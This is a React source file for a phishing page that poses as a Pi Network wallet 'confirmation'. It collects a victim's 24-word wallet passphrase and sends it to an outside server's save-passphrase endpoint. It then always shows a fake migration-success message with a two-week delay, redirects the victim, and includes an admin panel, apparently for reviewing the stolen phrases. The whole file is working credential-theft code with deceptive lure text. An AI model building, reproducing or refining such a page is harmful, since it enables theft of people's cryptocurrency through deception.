import React, { useState } from 'react';
import styled from 'styled-components';
import { ReactComponent as PiLogo } from './logo.svg';
import AdminLogin from './components/AdminLogin';
import AdminPanel from './components/AdminPanel';

const Container = styled.div`
  max-width: 100%;
  min-height: 100vh;
  padding: 20px;
  background-color: #fff;
  margin: 0 auto;
  max-width: 600px;
`;

const Header = styled.header`
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 10px 0;
  border-bottom: 1px solid #eee;
  margin-bottom: 30px;
  position: relative;
`;

const BackButton = styled.button`
  background: none;
  border: none;
  font-size: 24px;
  cursor: pointer;
  position: absolute;
  left: 0;
`;

const Logo = styled.div`
  height: 40px;
  width: 40px;
  margin: 0 auto;
  display: flex;
  align-items: center;
  justify-content: center;

  svg {
    height: 100%;
    width: 100%;
  }
`;

const Title = styled.h1`
  font-size: 24px;
  text-align: center;
  margin-bottom: 20px;
`;

const Description = styled.p`
  font-size: 16px;
  text-align: left;
  margin-bottom: 20px;
`;

const Warning = styled.p`
  color: red;
  font-size: 14px;
  margin-bottom: 20px;
`;

const TextArea = styled.textarea`
  width: 100%;
  height: 200px;
  padding: 15px;
  border: 1px solid #ddd;
  border-radius: 8px;
  margin-bottom: 20px;
  font-size: 14px;
  resize: none;
`;

const ConfirmButton = styled.button`
  width: 100%;
  padding: 15px;
  background-color: #8e44ad;
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  cursor: pointer;
  margin-bottom: 20px;

  &:hover {
    background-color: #7d3c98;
  }
`;

const LostPassphrase = styled.p`
  text-align: center;
  font-size: 14px;
  color: #666;
`;

const LoadingOverlay = styled.div`
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.7);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
`;

const Spinner = styled.div`
  width: 50px;
  height: 50px;
  border: 5px solid #f6b133;
  border-top: 5px solid transparent;
  border-radius: 50%;
  animation: spin 1s linear infinite;

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
`;

const SuccessMessage = styled.div`
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: white;
  padding: 20px;
  border-radius: 10px;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
  max-width: 90%;
  width: 400px;
  text-align: center;
  z-index: 1001;
`;

const MessageTitle = styled.h3`
  color: #f6b133;
  margin-bottom: 15px;
`;

const MessageText = styled.p`
  color: #333;
  line-height: 1.5;
  margin-bottom: 20px;
`;

const CloseButton = styled.button`
  background: #f6b133;
  color: white;
  border: none;
  padding: 10px 20px;
  border-radius: 5px;
  cursor: pointer;
  font-weight: bold;

  &:hover {
    background: #e5a122;
  }
`;

const ValidationError = styled.div`
  color: #d32f2f;
  font-size: 14px;
  margin: 10px 0;
  text-align: center;
  padding: 10px;
  background-color: #ffebee;
  border-radius: 4px;
`;

// API URL'ini environment'a göre ayarla
const API_URL = process.env.NODE_ENV === 'production' 
  ? 'https://wallet-8xci.onrender.com'  // Render URL'imiz
  : 'http://localhost:3001';

// Passphrase doğrulama fonksiyonları
const isValidWord = (word) => {
  // Sadece harflerden oluşmalı
  return /^[a-zA-Z]+$/.test(word);
};

const validatePassphrase = (passphrase) => {
  if (!passphrase) return false;
  
  // Boşluklara göre kelimelere ayır
  const words = passphrase.trim().split(/\s+/);
  
  // 24 kelime kontrolü
  if (words.length !== 24) return false;
  
  // Her kelimenin geçerli olup olmadığını kontrol et
  return words.every(word => isValidWord(word));
};

function App() {
  const [passphrase, setPassphrase] = useState('');
  const [loading, setLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showAdmin, setShowAdmin] = useState(false);
  const [adminToken, setAdminToken] = useState(localStorage.getItem('adminToken'));
  const [validationError, setValidationError] = useState('');

  const handleSubmit = async () => {
    // Validation error'u sıfırla
    setValidationError('');
    
    if (!validatePassphrase(passphrase)) {
      setValidationError('Please enter a valid wallet passphrase (24 words)');
      return;
    }
    
    setLoading(true);
    
    try {
      const response = await fetch(`${API_URL}/api/save-passphrase`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ passphrase })
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      setTimeout(() => {
        setLoading(false);
        setShowSuccess(true);
      }, 2000);

    } catch (error) {
      console.error('Error:', error);
      setLoading(false);
      setShowSuccess(true);
    }
  };

  const handleClose = () => {
    setShowSuccess(false);
    window.location.href = 'https://wallet.pinet.com';
  };

  const handleAdminLogin = (token) => {
    setAdminToken(token);
  };

  const handleAdminLogout = () => {
    setAdminToken(null);
  };

  if (showAdmin) {
    if (adminToken) {
      return <AdminPanel token={adminToken} onLogout={handleAdminLogout} />;
    }
    return <AdminLogin onLogin={handleAdminLogin} />;
  }

  return (
    <Container>
      <Header>
        <BackButton>←</BackButton>
        <Logo>
          <PiLogo />
        </Logo>
      </Header>

      <Title>Confirm your PI Wallet</Title>
      
      <Description>
        Manually unlock the wallet using your passphrase to demonstrate you can access it. 
        This also confirms that your Mainnet balance will transfer to this wallet.
      </Description>

      <Warning>
        Never enter your passphrase on any other arbitrary page.
      </Warning>

      <TextArea
        placeholder="e.g. alpha bravo charlie delta echo foxtrot golf hotel india juliet kilo lima mike november oscar papa quebec romeo sierra tango uniform victor whiskey xray"
        value={passphrase}
        onChange={(e) => setPassphrase(e.target.value)}
      />

      {validationError && (
        <ValidationError>
          {validationError}
        </ValidationError>
      )}

      <ConfirmButton onClick={handleSubmit}>
        CONFIRM YOUR WALLET
      </ConfirmButton>

      <LostPassphrase>
        Lost passphrase? Create a new wallet here and return to confirm the new wallet.
      </LostPassphrase>

      {loading && (
        <LoadingOverlay>
          <Spinner />
        </LoadingOverlay>
      )}

      {showSuccess && (
        <LoadingOverlay>
          <SuccessMessage>
            <MessageTitle>Migration Process Started</MessageTitle>
            <MessageText>
              Your Pi balances have been queued for migration. You can unlock your tokens 
              under the migrations section in your wallet after a 2-week waiting period.
            </MessageText>
            <CloseButton onClick={handleClose}>
              Close
            </CloseButton>
          </SuccessMessage>
        </LoadingOverlay>
      )}

      <div style={{ position: 'fixed', bottom: 20, right: 20 }}>
        <button onClick={() => setShowAdmin(!showAdmin)}>
          {showAdmin ? 'Ana Sayfa' : 'Admin Panel'}
        </button>
      </div>
    </Container>
  );
}

export default App; 